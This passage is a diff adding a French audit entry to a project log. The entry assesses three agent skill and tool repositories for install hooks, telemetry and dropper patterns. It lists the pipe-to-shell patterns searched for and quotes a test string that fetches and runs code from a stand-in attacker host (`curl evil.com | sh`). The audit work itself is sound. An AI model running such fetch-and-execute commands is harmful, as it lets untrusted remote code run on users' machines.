@@ -227,6 +227,59 @@ README (titre et puce), `SETUP.md` (étapes 2 et 4), les deux `QUICKSTART`, les 
 `CHEATSHEET` (nouvelle section 8, les suivantes renumérotées) et `ATTRIBUTION.md`.
 39 contrôles, 0 échec.
 
+## 2026-10-11 — Audit : `rtk` ajouté en `manual`, `impeccable` et `hyperframes` écartés
+
+Candidats tirés des dix étoiles ajoutées par l'humain entre le 2026-10-05 et le 2026-10-11, triés
+sur leur fiche GitHub ; trois audités à la demande. Méthode : clone au commit noté, lecture des
+manifestes, des hooks et du code exécutable qu'une installation lance, domaines sortants et motifs
+`curl | sh`, `irm | iex`, `base64 -d | sh`, `eval` sur réponse réseau. Skillspector **non lancé** :
+sur des dépôts de cette taille (8 à 105 Mo) il a plafonné à 0 % de couverture le 2026-10-04, la
+lecture manuelle porte seule l'audit. Tri des recoupements de descriptions par Laya
+(`laya_predict_batch`, `noul`, `min_confidence=0.75`), Jev en second avis sur les seuls cas sous
+le seuil, l'humain si les deux le sont — conformément aux règles de l'humain.
+
+**Ajouté : `rtk`** (`tool`, `manual`, `a4cddfc`, Apache-2.0, Patrick Szymkowiak) — un binaire Rust
+qui se place devant les commandes shell et en réduit la sortie avant que l'agent la lise.
+- Son `install.sh` télécharge la **dernière** release, avec vérification de somme de contrôle qui
+  refuse en cas d'échec (sauf `RTK_SKIP_CHECKSUM=1`). Ce n'est pas l'état inspecté : `SETUP.md`
+  documente donc `cargo install --git … --rev a4cddfc`, qui compile le commit audité (Rust 1.91+).
+- Télémétrie : URL compilée seulement dans les builds de release, **consentement explicite exigé**
+  avant tout envoi (commentaire « RGPD » dans `src/core/telemetry.rs`), `RTK_TELEMETRY_DISABLED=1`
+  pour la couper. Seule crate réseau : `ureq`, appelée uniquement par la télémétrie.
+- `rtk init -g` est **global** : `~/.claude/RTK.md`, `@RTK.md` ajouté à `~/.claude/CLAUDE.md`, et un
+  hook dans les réglages utilisateur qui réécrit toutes les commandes shell de tous les projets.
+  `rtk init` sans `-g` n'installe aucun hook (lu dans `src/hooks/init/claude.rs`,
+  `run_default_mode`) : un bloc dans le `CLAUDE.md` du projet et un modèle de filtres. Les deux
+  acceptent `--dry-run` et `--uninstall`. D'où `manual` : l'humain l'installe, jamais l'agent, et
+  jamais à la racine du workspace.
+- Motifs de dropper : l'installeur documenté du projet, depuis son propre dépôt ; une chaîne
+  `curl evil.com | sh` dans un test de `src/hooks/integrity.rs`. Rien d'autre.
+- Les 12 `SKILL.md` de son `.claude/skills/` servent au développement de `rtk` lui-même : comptés
+  dans le total, jamais liés.
+
+**Écartés, décision de l'humain sur ces constats :**
+- `impeccable` (`c63b8dd`, Apache-2.0) — une skill de qualité, mais ce qui tourne est un binaire
+  précompilé (`engine-v0.1.14`) téléchargé depuis les releases du projet (somme vérifiée, refus en
+  cas d'échec), pas la source inspectée ; installé par sa marketplace, ses hooks le lancent à chaque
+  `Edit`/`Write` et à chaque fin de tour. Et il entre en concurrence avec le socle par défaut :
+  Jev retient une concurrence avec `taste-skill` (0,82) et `redesign-skill` (0,84) après abstention
+  de Laya ; `soft-skill` resté indécis des deux côtés (Laya 0,60, Jev 0,45). Laya écarte, au-dessus
+  du seuil, une concurrence avec `make-interfaces-feel-better` (0,83), `design-system` (0,79) et
+  `accessibility` (0,82) — retenu selon la règle, contre la lecture de l'agent, qui voyait un
+  recoupement : un cas à garder pour calibrer le seuil. Les domaines publicitaires trouvés dans son
+  code (`googletagmanager`, `connect.facebook.net`) sont des données de test du code Rust.
+- `hyperframes` (`d4dd6c0`, Apache-2.0, HeyGen) — ses skills lancent `npx hyperframes` (156 fois,
+  dont 2 fois `@latest`) : le code exécuté est toujours la dernière version npm, l'épinglage n'y
+  protège rien. Télémétrie PostHog **active par défaut** (`HYPERFRAMES_NO_TELEMETRY=1` ou
+  `DO_NOT_TRACK=1` pour la couper). 21 skills, environ 2 700 tokens de descriptions par session.
+  Recoupements indécis des deux côtés : avec `ui-demo` (Laya 0,74, Jev 0,62) et `slideshow` avec
+  `pptx` (Laya 0,72, Jev 0,59) ; `motion-graphics` sans concurrence avec `motion-foundations`
+  (Laya 0,88). Hors du `stock`, réservé aux briques d'IA. Note : son arborescence dépasse la limite
+  de 260 caractères des chemins Windows dans un dossier profond ; `core.longpaths` était nécessaire.
+
+**Chiffres** : 26 lignes au catalogue ; fichiers `SKILL.md` aux commits épinglés, même méthode
+(`git ls-tree`, nom exact) : 2927 + 12 = **2939**. 39 contrôles, 0 échec.
+
 ---
 
 ## Avant de modifier ce fichier
